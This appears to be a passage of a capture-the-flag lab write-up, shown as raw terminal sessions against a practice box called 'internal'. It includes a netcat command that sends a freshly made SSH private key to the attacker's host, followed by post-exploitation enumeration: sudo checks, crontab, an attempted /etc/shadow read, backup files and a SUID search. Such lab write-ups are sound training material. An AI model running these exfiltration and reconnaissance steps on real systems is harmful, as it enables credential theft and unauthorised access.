
used ssh
```sh
aubreanna@internal:~$ cd .ssh
aubreanna@internal:~/.ssh$ ls -la
total 8
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 ..
aubreanna@internal:~/.ssh$ sshkeygen

Command 'sshkeygen' not found, did you mean:

  command 'ssh-keygen' from deb openssh-client

Try: apt install <deb name>

aubreanna@internal:~/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/aubreanna/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/aubreanna/.ssh/id_rsa.
Your public key has been saved in /home/aubreanna/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:M0lTvkXq0UAVIasbY/c7BeiGJZjHFBmxHy1KDEaa5EQ aubreanna@internal
The key's randomart image is:
+---[RSA 2048]----+
|   .E.+ +*=.=o   |
|   + + oo+ O     |
|    +  =* B.+    |
|      oo+Bo*.    |
|       .S==  .   |
|       ..Bo.  .  |
|        ..  ..   |
|            ..   |
|            ..   |
+----[SHA256]-----+
aubreanna@internal:~/.ssh$ nc 10.18.21.236 12345 < id_rsa
aubreanna@internal:~/.ssh$
```

```sh
┌──(kali㉿kali)-[~/thm/internal]
└─$ ls -la
total 12
drwxrwxr-x  2 kali kali 4096 Jul 30 17:14 .
drwxr-xr-x 33 kali kali 4096 Jul 30 17:09 ..
-rw-rw-r--  1 kali kali 1679 Jul 30 17:15 id_rsa
                                                                                                                              
┌──(kali㉿kali)-[~/thm/internal]
└─$ ssh aubreanna@10.10.115.97                                
aubreanna@10.10.115.97´s password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 30 15:20:37 UTC 2024

  System load:  0.0               Processes:              115
  Usage of /:   64.0% of 8.79GB   Users logged in:        0
  Memory usage: 35%               IP address for eth0:    10.10.115.97
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Jul 30 15:08 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ sudo -l
[sudo] password for aubreanna: 
Sorry, user aubreanna may not run sudo on internal.
aubreanna@internal:~$ cd snap
aubreanna@internal:~/snap$ ls -la
total 12
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 ..
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 docker
aubreanna@internal:~/snap$ cd docker
aubreanna@internal:~/snap/docker$ ls -la
total 8
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 ..
lrwxrwxrwx 1 aubreanna aubreanna    3 Aug  3  2020 current -> 471
aubreanna@internal:~/snap/docker$ 
aubreanna@internal:~/snap/docker$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
aubreanna@internal:~/snap/docker$ cd ../..
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Jul 30 15:08 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ ls -la *
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt

snap:
total 12
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 ..
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 docker
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
aubreanna@internal:~$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.18.21.236 56270 10.10.115.97 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=C.UTF-8
XDG_SESSION_ID=13
USER=aubreanna
PWD=/home/aubreanna
HOME=/home/aubreanna
SSH_CLIENT=10.18.21.236 56270 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/1
MAIL=/var/mail/aubreanna
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LOGNAME=aubreanna
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
OLDPWD=/home/aubreanna/snap/docker
aubreanna@internal:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
aubreanna@internal:~$ cat /proc/version
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
aubreanna@internal:~$ ls -la /var/backup
ls: cannot access '/var/backup': No such file or directory
aubreanna@internal:~$ cd var
-bash: cd: var: No such file or directory
aubreanna@internal:~$ cd /var
aubreanna@internal:/var$ ls -la
total 56
drwxr-xr-x 14 root root   4096 Aug  3  2020 .
drwxr-xr-x 24 root root   4096 Aug  3  2020 ..
drwxr-xr-x  2 root root   4096 Aug  9  2020 backups
drwxr-xr-x 14 root root   4096 Aug  3  2020 cache
drwxrwxrwt  2 root root   4096 Feb  3  2020 crash
drwxr-xr-x 47 root root   4096 Aug  3  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Feb  3  2020 lock -> /run/lock
drwxrwxr-x 12 root syslog 4096 Aug  3  2020 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Feb  3  2020 run -> /run
drwxr-xr-x  3 root root   4096 Aug  3  2020 snap
drwxr-xr-x  4 root root   4096 Feb  3  2020 spool
drwxrwxrwt  5 root root   4096 Jul 30 15:09 tmp
drwxr-xr-x  3 root root   4096 Aug  3  2020 www
aubreanna@internal:/var$ cd backups
aubreanna@internal:/var/backups$ ls -la
total 764
drwxr-xr-x  2 root root     4096 Aug  9  2020 .
drwxr-xr-x 14 root root     4096 Aug  3  2020 ..
-rw-r--r--  1 root root    51200 Aug  9  2020 alternatives.tar.0
-rw-r--r--  1 root root    37895 Aug  3  2020 apt.extended_states.0
-rw-r--r--  1 root root     3974 Aug  3  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      437 Aug  3  2020 dpkg.diversions.0
-rw-r--r--  1 root root      207 Aug  3  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   649943 Aug  3  2020 dpkg.status.0
-rw-------  1 root root      746 Aug  3  2020 group.bak
-rw-------  1 root shadow    625 Aug  3  2020 gshadow.bak
-rw-------  1 root root     1626 Aug  3  2020 passwd.bak
-rw-------  1 root shadow   1056 Aug  3  2020 shadow.bak
aubreanna@internal:/var/backups$ cd ..
aubreanna@internal:/var$ ls -la
total 56
drwxr-xr-x 14 root root   4096 Aug  3  2020 .
drwxr-xr-x 24 root root   4096 Aug  3  2020 ..
drwxr-xr-x  2 root root   4096 Aug  9  2020 backups
drwxr-xr-x 14 root root   4096 Aug  3  2020 cache
drwxrwxrwt  2 root root   4096 Feb  3  2020 crash
drwxr-xr-x 47 root root   4096 Aug  3  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Feb  3  2020 lock -> /run/lock
drwxrwxr-x 12 root syslog 4096 Aug  3  2020 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Feb  3  2020 run -> /run
drwxr-xr-x  3 root root   4096 Aug  3  2020 snap
drwxr-xr-x  4 root root   4096 Feb  3  2020 spool
drwxrwxrwt  5 root root   4096 Jul 30 15:09 tmp
drwxr-xr-x  3 root root   4096 Aug  3  2020 www
aubreanna@internal:/var$ cd snap
aubreanna@internal:/var/snap$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 14 root root 4096 Aug  3  2020 ..
drwxr-xr-x  5 root root 4096 Aug  3  2020 core
aubreanna@internal:/var/snap$ cd core
aubreanna@internal:/var/snap/core$ ls -la
total 20
drwxr-xr-x 5 root root 4096 Aug  3  2020 .
drwxr-xr-x 3 root root 4096 Aug  3  2020 ..
drwxr-xr-x 2 root root 4096 Aug  3  2020 8268
drwxr-xr-x 2 root root 4096 Aug  3  2020 9665
drwxr-xr-x 2 root root 4096 Aug  3  2020 common
lrwxrwxrwx 1 root root    4 Aug  3  2020 current -> 9665
aubreanna@internal:/var/snap/core$ cd 9665
aubreanna@internal:/var/snap/core/9665$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Aug  3  2020 .
drwxr-xr-x 5 root root 4096 Aug  3  2020 ..
aubreanna@internal:/var/snap/core/9665$ cd ../8268
aubreanna@internal:/var/snap/core/8268$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Aug  3  2020 .
drwxr-xr-x 5 root root 4096 Aug  3  2020 ..
aubreanna@internal:/var/snap/core/8268$ cd ../common
aubreanna@internal:/var/snap/core/common$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Aug  3  2020 .
drwxr-xr-x 5 root root 4096 Aug  3  2020 ..
aubreanna@internal:/var/snap/core/common$ cd..
cd..: command not found
aubreanna@internal:/var/snap/core/common$ cd ..
aubreanna@internal:/var/snap/core$ ls -la
total 20
drwxr-xr-x 5 root root 4096 Aug  3  2020 .
drwxr-xr-x 3 root root 4096 Aug  3  2020 ..
drwxr-xr-x 2 root root 4096 Aug  3  2020 8268
drwxr-xr-x 2 root root 4096 Aug  3  2020 9665
drwxr-xr-x 2 root root 4096 Aug  3  2020 common
lrwxrwxrwx 1 root root    4 Aug  3  2020 current -> 9665
aubreanna@internal:/var/snap/core$ cd ..
aubreanna@internal:/var/snap$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 14 root root 4096 Aug  3  2020 ..
drwxr-xr-x  5 root root 4096 Aug  3  2020 core
aubreanna@internal:/var/snap$ cd ..
aubreanna@internal:/var$ ls -la
total 56
drwxr-xr-x 14 root root   4096 Aug  3  2020 .
drwxr-xr-x 24 root root   4096 Aug  3  2020 ..
drwxr-xr-x  2 root root   4096 Aug  9  2020 backups
drwxr-xr-x 14 root root   4096 Aug  3  2020 cache
drwxrwxrwt  2 root root   4096 Feb  3  2020 crash
drwxr-xr-x 47 root root   4096 Aug  3  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Feb  3  2020 lock -> /run/lock
drwxrwxr-x 12 root syslog 4096 Aug  3  2020 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Feb  3  2020 run -> /run
drwxr-xr-x  3 root root   4096 Aug  3  2020 snap
drwxr-xr-x  4 root root   4096 Feb  3  2020 spool
drwxrwxrwt  5 root root   4096 Jul 30 15:09 tmp
drwxr-xr-x  3 root root   4096 Aug  3  2020 www
aubreanna@internal:/var$ cd log
aubreanna@internal:/var/log$ ls -la
total 10260
drwxrwxr-x  12 root      syslog             4096 Aug  3  2020 .
drwxr-xr-x  14 root      root               4096 Aug  3  2020 ..
-rw-r--r--   1 root      root              29347 Aug  3  2020 alternatives.log
drwxr-x---   2 root      adm                4096 Aug  3  2020 apache2
drwxr-xr-x   2 root      root               4096 Aug  3  2020 apt
-rw-r-----   1 syslog    adm             2369074 Jul 30 15:21 auth.log
-rw-r--r--   1 root      root              56751 Feb  3  2020 bootstrap.log
-rw-rw----   1 root      utmp            3230592 Jul 30 14:11 btmp
-rw-r--r--   1 root      root              52985 Jul 30 11:54 cloud-init-output.log
-rw-r--r--   1 syslog    adm             1036574 Jul 30 11:54 cloud-init.log
drwxr-xr-x   2 root      root               4096 Aug  3  2020 dbconfig-common
drwxr-xr-x   2 root      root               4096 Jan 24  2020 dist-upgrade
-rw-r--r--   1 root      root             711828 Aug  3  2020 dpkg.log
-rw-r--r--   1 root      root              32032 Aug  3  2020 faillog
drwxr-xr-x   3 root      root               4096 Aug  3  2020 installer
drwxr-sr-x+  3 root      systemd-journal    4096 Aug  3  2020 journal
-rw-r-----   1 syslog    adm              960751 Jul 30 11:54 kern.log
drwxr-xr-x   2 landscape landscape          4096 Aug  3  2020 landscape
-rw-rw-r--   1 root      utmp             292292 Jul 30 15:20 lastlog
drwxr-xr-x   2 root      root               4096 Nov 23  2018 lxd
drwxr-x---   2 mysql     adm                4096 Aug  3  2020 mysql
-rw-r-----   1 syslog    adm             1860272 Jul 30 15:35 syslog
-rw-------   1 root      root              64064 Aug  3  2020 tallylog
drwxr-x---   2 root      adm                4096 Aug  3  2020 unattended-upgrades
-rw-rw-r--   1 root      utmp              67200 Jul 30 15:20 wtmp
aubreanna@internal:/var/log$ find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9665/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9665/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
aubreanna@internal:/var/log$ 

```